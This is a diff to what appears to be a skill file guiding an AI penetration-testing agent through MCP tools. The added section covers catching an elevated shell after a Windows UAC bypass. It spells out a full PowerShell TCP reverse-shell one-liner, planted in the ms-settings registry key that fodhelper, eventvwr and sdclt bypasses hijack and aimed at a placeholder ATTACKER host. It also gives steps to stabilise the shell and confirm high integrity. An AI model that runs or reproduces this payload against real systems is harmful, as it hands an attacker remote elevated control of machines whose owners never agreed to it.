@@ -560,6 +560,28 @@ reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{GUID}" /v St
 
 ## Step 6: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When UAC bypass achieves elevated execution, **catch the elevated shell via the
+MCP shell-server** rather than relying on the auto-elevating binary to spawn a
+visible console window. The bypassed process runs at high integrity in a
+different window station -- a reverse shell lets the agent interact with it.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Set the UAC bypass payload to a reverse shell:
+   ```powershell
+   # Fodhelper / Eventvwr / Sdclt bypass — set registry command to:
+   Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
+     -Name "(default)" `
+     -Value "powershell -nop -c `"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`"" -Force
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="whoami /groups | findstr High")`
+
+If the target lacks outbound connectivity, use the bypass to launch a local
+elevated cmd.exe and interact through an existing session, or use a base64-
+encoded bind shell payload.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
